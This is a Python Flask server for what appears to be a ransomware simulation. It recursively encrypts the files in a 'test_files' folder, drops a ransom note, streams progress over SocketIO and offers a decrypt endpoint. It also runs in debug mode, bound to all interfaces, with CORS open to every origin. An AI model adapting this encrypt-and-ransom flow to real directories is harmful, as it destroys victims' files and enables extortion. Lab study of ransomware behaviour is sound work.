from flask import Flask, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import os
from encryptor import encrypt_file, decrypt_file
from key_manager import generate_key, load_key
from ransom_note import create_ransom_note
from logger import log_event

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

FOLDER_PATH = "test_files"

@app.route("/encrypt", methods=["POST"])
def encrypt_folder():
    if not os.path.exists("key.key"):
        generate_key()
    key = load_key()
    for root, _, files in os.walk(FOLDER_PATH):
        for file in files:
            encrypt_file(os.path.join(root, file), key)
            log_event(f"Encrypted: {file}")
            # Emit progress updates (this could be more granular in a real scenario)
            socketio.emit("encryption_update", {"file": file, "status": "encrypted"})
    create_ransom_note(FOLDER_PATH)
    log_event("Ransom note created.")
    return jsonify({"message": "Files encrypted successfully."}), 200

@app.route("/decrypt", methods=["POST"])
def decrypt_folder():
    key = load_key()
    for root, _, files in os.walk(FOLDER_PATH):
        for file in files:
            if file.endswith(".locked"):
                decrypt_file(os.path.join(root, file), key)
                log_event(f"Decrypted: {file}")
                socketio.emit("decryption_update", {"file": file, "status": "decrypted"})
    log_event("Files successfully decrypted.")
    return jsonify({"message": "Files decrypted successfully."}), 200

if __name__ == "__main__":
    socketio.run(app, debug=True, host="0.0.0.0", port=5000)
